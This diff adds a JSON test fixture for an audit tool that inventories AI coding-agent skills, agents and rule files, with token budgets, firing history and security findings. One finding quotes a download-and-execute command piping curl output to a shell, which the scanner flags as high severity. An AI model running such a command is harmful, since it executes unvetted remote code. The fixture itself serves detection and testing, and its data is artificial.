@@ -1,0 +1,484 @@
+{
+  "version": "0.5.0",
+  "generatedAt": "2026-08-04T12:00:00.000Z",
+  "tookMs": 910,
+  "root": "/fixture",
+  "header": {
+    "items": 11,
+    "providers": 3,
+    "listing": {
+      "chars": 8420,
+      "budgetChars": 8000,
+      "pct": 105,
+      "over": true
+    },
+    "injectedChars": 15000,
+    "injectedTokens": 3750,
+    "neverFired": 2,
+    "tracked": 9,
+    "deadWeightChars": 8600,
+    "flagged": 1,
+    "flaggedHigh": 1
+  },
+  "history": {
+    "transcriptFiles": 87,
+    "windowStart": "2026-06-24T00:00:00Z",
+    "windowEnd": "2026-08-04T00:00:00Z",
+    "backfilledSince": "2026-02-26T09:00:00Z"
+  },
+  "caveats": [
+    "Cursor's local conversation store could not be opened (SQLITE_CANTOPEN); cursor rules show no readable history.",
+    "3 ledger lines were unreadable and were skipped."
+  ],
+  "providerWindows": {
+    "claude": { "start": "2026-06-24T00:00:00Z", "end": "2026-08-04T00:00:00Z" },
+    "codex": { "start": "2026-03-03T00:00:00Z", "end": "2026-08-04T00:00:00Z" },
+    "cursor": { "start": "2026-05-12T00:00:00Z", "end": "2026-08-03T00:00:00Z" }
+  },
+  "portfolio": {
+    "sessions": 120,
+    "sessionsWithFires": 31,
+    "concentration": { "items": 2, "pct": 84, "ids": ["id-plug", "id-scoped", "id-blind"] },
+    "topSpend": [
+      { "id": "id-burst-old", "name": "burst-old", "chars": 6800 },
+      { "id": "id-blind", "name": "blindspot", "chars": 420 },
+      { "id": "id-ghost", "name": "ghost", "chars": 300 }
+    ],
+    "flaggedByActivity": [
+      {
+        "id": "id-blind",
+        "name": "blindspot",
+        "fires": 9,
+        "lastFired": "2026-08-01T09:00:00Z",
+        "projects": 2
+      }
+    ]
+  },
+  "delta": {
+    "since": "2026-07-28T09:15:00.000Z",
+    "items": 2,
+    "injectedChars": 1204,
+    "pluginsUpdated": [
+      { "name": "superpowers", "to": "6.2.0" },
+      { "name": "impeccable", "from": "1.2.0", "to": "1.3.0" }
+    ]
+  },
+  "budgetCut": {
+    "budgetChars": 8000,
+    "listingChars": 8420,
+    "headroomChars": 420,
+    "order": [
+      {
+        "id": "id-plug",
+        "name": "superpowers:brainstorming",
+        "chars": 300,
+        "fires": 20,
+        "cumChars": 300,
+        "dropped": false
+      },
+      { "id": "id-scoped", "name": "scoped-one", "chars": 260, "fires": 11, "cumChars": 560, "dropped": false },
+      { "id": "id-blind", "name": "blindspot", "chars": 420, "fires": 9, "cumChars": 980, "dropped": false },
+      { "id": "id-burst-old", "name": "burst-old", "chars": 6800, "fires": 4, "cumChars": 7780, "dropped": false },
+      { "id": "id-burst-new", "name": "burst-new", "chars": 640, "fires": 3, "cumChars": 8420, "dropped": true }
+    ]
+  },
+  "growth": {
+    "ownedSource": "scan snapshots, from the first recorded run forward",
+    "weeks": [
+      { "weekStart": "2026-06-29", "owned": 10, "firedItems": 3 },
+      { "weekStart": "2026-07-06", "owned": 11, "firedItems": 2 },
+      { "weekStart": "2026-07-13", "firedItems": 4 },
+      { "weekStart": "2026-07-20", "owned": 13, "firedItems": 0 },
+      { "weekStart": "2026-07-27", "owned": 14, "firedItems": 5 }
+    ]
+  },
+  "superseded": [
+    {
+      "plugin": "superpowers",
+      "marketplace": "claude-plugins-official",
+      "active": "6.2.0",
+      "versions": ["5.1.0", "6.1.1"],
+      "bytes": 3800000,
+      "paths": [
+        "/home/u/.claude/plugins/cache/superpowers/5.1.0",
+        "/home/u/.claude/plugins/cache/superpowers/6.1.1"
+      ]
+    }
+  ],
+  "items": [
+    {
+      "id": "id-blind",
+      "name": "blindspot",
+      "source": "claude",
+      "kind": "skill",
+      "path": "/home/u/.claude/skills/blindspot",
+      "scope": "user",
+      "enabled": true,
+      "togglable": true,
+      "injection": "description",
+      "injectedChars": 420,
+      "bodyChars": 3600,
+      "freshness": { "editedAt": "2026-07-30T00:00:00Z", "days": 5, "firesSince": 2, "source": "mtime" },
+      "refs": {
+        "checked": 5,
+        "missing": [{ "path": "reference/missing-guide.md", "line": 12 }],
+        "notExecutable": [{ "path": "scripts/validate.py", "line": 31 }]
+      },
+      "bundledFiles": [
+        { "relPath": "reference/typography.md", "readInFires": 0, "ofFires": 0 },
+        { "relPath": "scripts/validate.py", "readInFires": 3, "ofFires": 4 }
+      ],
+      "fires": {
+        "invocations": 4,
+        "sessions": 4,
+        "firstFired": "2026-07-02T09:00:00Z",
+        "lastFired": "2026-08-01T09:00:00Z",
+        "interruptedAfter": 0,
+        "lifetime": {
+          "invocations": 9,
+          "sessions": 7,
+          "firstFired": "2026-04-02T09:00:00Z",
+          "lastFired": "2026-08-01T09:00:00Z"
+        },
+        "trackedSince": "2026-03-01T00:00:00Z",
+        "byChannel": { "auto": 9, "typed": 0 },
+        "byEntrypoint": { "interactive": 0, "automated": 0, "unknown": 9 },
+        "byAgent": { "main": 7, "sidechain": 2 },
+        "byModel": [
+          { "model": "claude-fable-5", "count": 6 },
+          { "model": "claude-haiku-4", "count": 3 }
+        ],
+        "weeklyBins": [
+          { "weekStart": "2026-06-29", "count": 1 },
+          { "weekStart": "2026-07-13", "count": 1 },
+          { "weekStart": "2026-07-20", "count": 1 },
+          { "weekStart": "2026-07-27", "count": 1 }
+        ]
+      },
+      "findings": [
+        {
+          "skill": "blindspot",
+          "file": "SKILL.md",
+          "line": 4,
+          "check": "download-execute",
+          "level": "flag",
+          "severity": "high",
+          "confidence": "likely",
+          "message": "downloads and pipes to a shell",
+          "evidence": "curl -s https://x | sh"
+        }
+      ]
+    },
+    {
+      "id": "id-burst-old",
+      "name": "burst-old",
+      "source": "claude",
+      "kind": "skill",
+      "path": "/home/u/.claude/skills/burst-old",
+      "scope": "user",
+      "enabled": true,
+      "togglable": true,
+      "injection": "description",
+      "injectedChars": 6800,
+      "bodyChars": 1200,
+      "provenance": { "installedAt": "2026-04-01T00:00:00Z", "source": "birthtime" },
+      "fires": {
+        "invocations": 0,
+        "sessions": 0,
+        "interruptedAfter": 0,
+        "lifetime": {
+          "invocations": 4,
+          "sessions": 2,
+          "firstFired": "2026-05-05T09:00:00Z",
+          "lastFired": "2026-05-08T09:00:00Z"
+        },
+        "trackedSince": "2026-03-01T00:00:00Z",
+        "byChannel": { "auto": 4, "typed": 0 },
+        "quiet": { "days": 88, "longestPriorGapDays": 2, "gapsCounted": 3 },
+        "spread": { "activeWeeks": 1, "weeksSinceFirst": 13, "spanDays": 3, "oneBurst": true },
+        "weeklyBins": [{ "weekStart": "2026-05-04", "count": 4 }]
+      },
+      "findings": []
+    },
+    {
+      "id": "id-burst-new",
+      "name": "burst-new",
+      "source": "claude",
+      "kind": "skill",
+      "path": "/home/u/.claude/skills/burst-new",
+      "scope": "user",
+      "enabled": true,
+      "togglable": true,
+      "injection": "description",
+      "injectedChars": 640,
+      "bodyChars": 800,
+      "fires": {
+        "invocations": 3,
+        "sessions": 1,
+        "firstFired": "2026-07-28T09:00:00Z",
+        "lastFired": "2026-07-30T09:00:00Z",
+        "interruptedAfter": 0,
+        "lifetime": {
+          "invocations": 3,
+          "sessions": 1,
+          "firstFired": "2026-07-28T09:00:00Z",
+          "lastFired": "2026-07-30T09:00:00Z"
+        },
+        "trackedSince": "2026-03-01T00:00:00Z",
+        "byChannel": { "auto": 3, "typed": 0 },
+        "spread": { "activeWeeks": 1, "weeksSinceFirst": 1, "spanDays": 2, "oneBurst": true },
+        "weeklyBins": [{ "weekStart": "2026-07-27", "count": 3 }]
+      },
+      "findings": []
+    },
+    {
+      "id": "id-scoped",
+      "name": "scoped-one",
+      "source": "claude",
+      "kind": "skill",
+      "path": "/home/u/.claude/skills/scoped-one",
+      "scope": "user",
+      "enabled": true,
+      "togglable": true,
+      "injection": "description",
+      "injectedChars": 260,
+      "bodyChars": 900,
+      "scopeNote": { "allFiresIn": "context-audit", "alsoAtScope": "project" },
+      "confusable": [{ "itemId": "id-blind", "name": "blindspot", "fires": 9 }],
+      "coFiredSessions": 0,
+      "nearMiss": [{ "name": "/scopedone", "count": 2 }],
+      "fires": {
+        "invocations": 5,
+        "sessions": 2,
+        "firstFired": "2026-07-07T09:00:00Z",
+        "lastFired": "2026-07-31T09:00:00Z",
+        "interruptedAfter": 0,
+        "lifetime": {
+          "invocations": 11,
+          "sessions": 5,
+          "firstFired": "2026-05-20T09:00:00Z",
+          "lastFired": "2026-07-31T09:00:00Z"
+        },
+        "trackedSince": "2026-03-01T00:00:00Z",
+        "byChannel": { "auto": 11, "typed": 0 },
+        "byProject": [{ "name": "context-audit", "count": 11 }],
+        "weeklyBins": [
+          { "weekStart": "2026-07-06", "count": 5 },
+          { "weekStart": "2026-07-27", "count": 6 }
+        ]
+      },
+      "findings": []
+    },
+    {
+      "id": "id-agent-priced",
+      "name": "code-reviewer",
+      "source": "claude",
+      "kind": "agent",
+      "path": "/home/u/.claude/agents/code-reviewer.md",
+      "scope": "user",
+      "enabled": true,
+      "togglable": false,
+      "readOnlyReason": "agents are read-only in v1",
+      "injection": "description",
+      "injectedChars": 380,
+      "bodyChars": 2400,
+      "agentCost": { "runs": 2, "totalTokens": 184320, "medianTokens": 88000 },
+      "fires": {
+        "invocations": 2,
+        "sessions": 2,
+        "firstFired": "2026-07-10T09:00:00Z",
+        "lastFired": "2026-07-29T09:00:00Z",
+        "interruptedAfter": 0,
+        "lifetime": {
+          "invocations": 5,
+          "sessions": 4,
+          "firstFired": "2026-04-18T09:00:00Z",
+          "lastFired": "2026-07-29T09:00:00Z"
+        },
+        "trackedSince": "2026-03-01T00:00:00Z",
+        "byChannel": { "auto": 5, "typed": 0 }
+      },
+      "findings": []
+    },
+    {
+      "id": "id-agent-bare",
+      "name": "doc-writer",
+      "source": "claude",
+      "kind": "agent",
+      "path": "/home/u/.claude/agents/doc-writer.md",
+      "scope": "user",
+      "enabled": true,
+      "togglable": false,
+      "readOnlyReason": "agents are read-only in v1",
+      "injection": "description",
+      "injectedChars": 300,
+      "bodyChars": 1100,
+      "fires": {
+        "invocations": 1,
+        "sessions": 1,
+        "firstFired": "2026-07-15T09:00:00Z",
+        "lastFired": "2026-07-15T09:00:00Z",
+        "interruptedAfter": 0,
+        "lifetime": {
+          "invocations": 3,
+          "sessions": 3,
+          "firstFired": "2026-05-02T09:00:00Z",
+          "lastFired": "2026-07-15T09:00:00Z"
+        },
+        "trackedSince": "2026-03-01T00:00:00Z",
+        "byChannel": { "auto": 3, "typed": 0 }
+      },
+      "findings": []
+    },
+    {
+      "id": "id-plug",
+      "name": "superpowers:brainstorming",
+      "source": "claude",
+      "kind": "skill",
+      "path": "/home/u/.claude/plugins/cache/superpowers/6.2.0/skills/brainstorming",
+      "scope": "user",
+      "enabled": true,
+      "togglable": false,
+      "readOnlyReason": "plugin assets are read-only",
+      "injection": "description",
+      "injectedChars": 300,
+      "bodyChars": 2600,
+      "plugin": {
+        "name": "superpowers",
+        "marketplace": "claude-plugins-official",
+        "version": "6.2.0",
+        "latest": "7.0.0",
+        "installedAt": "2026-03-24T00:00:00Z",
+        "lastUpdated": "2026-07-25T00:00:00Z"
+      },
+      "fires": {
+        "invocations": 6,
+        "sessions": 3,
+        "firstFired": "2026-06-25T09:00:00Z",
+        "lastFired": "2026-07-29T09:00:00Z",
+        "interruptedAfter": 0,
+        "lifetime": {
+          "invocations": 20,
+          "sessions": 12,
+          "firstFired": "2026-03-30T09:00:00Z",
+          "lastFired": "2026-07-29T09:00:00Z"
+        },
+        "trackedSince": "2026-03-01T00:00:00Z",
+        "byChannel": { "auto": 18, "typed": 2 },
+        "sinceUpdate": { "at": "2026-07-25T00:00:00Z", "days": 10, "since": 1, "prior": 7 },
+        "weeklyBins": [
+          { "weekStart": "2026-06-15", "count": 6 },
+          { "weekStart": "2026-07-13", "count": 4 },
+          { "weekStart": "2026-07-20", "count": 3 },
+          { "weekStart": "2026-07-27", "count": 1 }
+        ]
+      },
+      "findings": []
+    },
+    {
+      "id": "id-off",
+      "name": "retired",
+      "source": "claude",
+      "kind": "skill",
+      "path": "/home/u/.claude/skills-disabled/retired",
+      "scope": "user",
+      "enabled": false,
+      "togglable": true,
+      "injection": "description",
+      "injectedChars": 520,
+      "bodyChars": 1400,
+      "disabledSafety": {
+        "disabledAt": "2026-06-15T00:00:00Z",
+        "disabledAtSource": "ctime",
+        "days": 50,
+        "attemptsSince": 2,
+        "referencedBy": ["superpowers:brainstorming", "harden"]
+      },
+      "fires": null,
+      "findings": []
+    },
+    {
+      "id": "id-agents",
+      "name": "AGENTS.md",
+      "source": "codex",
+      "kind": "instructions",
+      "path": "/home/u/.codex/AGENTS.md",
+      "scope": "user",
+      "enabled": true,
+      "togglable": false,
+      "readOnlyReason": "v1",
+      "injection": "body",
+      "injectedChars": 900,
+      "bodyChars": 900,
+      "readBy": ["claude", "codex"],
+      "crossProvider": [
+        { "itemId": "id-agents-proj", "source": "cursor", "name": "AGENTS.md", "identical": true }
+      ],
+      "fires": {
+        "invocations": 0,
+        "sessions": 0,
+        "interruptedAfter": 0,
+        "lifetime": {
+          "invocations": 4,
+          "sessions": 4,
+          "firstFired": "2026-03-09T09:00:00Z",
+          "lastFired": "2026-07-30T09:00:00Z"
+        },
+        "trackedSince": "2026-03-01T00:00:00Z",
+        "byProvider": { "codex": 4 }
+      },
+      "findings": []
+    },
+    {
+      "id": "id-agents-proj",
+      "name": "AGENTS.md",
+      "source": "agents-md",
+      "kind": "instructions",
+      "path": "/fixture/AGENTS.md",
+      "scope": "project",
+      "enabled": true,
+      "togglable": false,
+      "readOnlyReason": "v1",
+      "injection": "body",
+      "injectedChars": 640,
+      "bodyChars": 640,
+      "readBy": ["codex", "cursor"],
+      "findings": []
+    },
+    {
+      "id": "id-rule",
+      "name": "style-rule",
+      "source": "cursor",
+      "kind": "rule",
+      "path": "/fixture/.cursor/rules/style.mdc",
+      "scope": "project",
+      "enabled": true,
+      "togglable": false,
+      "readOnlyReason": "v1",
+      "injection": "body",
+      "injectedChars": 350,
+      "bodyChars": 350,
+      "readBy": ["cursor"],
+      "fires": {
+        "invocations": 6,
+        "sessions": 3,
+        "firstFired": "2026-07-02T09:00:00Z",
+        "lastFired": "2026-07-31T09:00:00Z",
+        "interruptedAfter": 0,
+        "lifetime": {
+          "invocations": 12,
+          "sessions": 6,
+          "firstFired": "2026-05-14T09:00:00Z",
+          "lastFired": "2026-07-31T09:00:00Z"
+        },
+        "trackedSince": "2026-05-12T00:00:00Z",
+        "byProvider": { "cursor": 12 },
+        "weeklyBins": [
+          { "weekStart": "2026-07-13", "count": 5 },
+          { "weekStart": "2026-07-27", "count": 7 }
+        ]
+      },
+      "findings": []
+    }
+  ]
+}
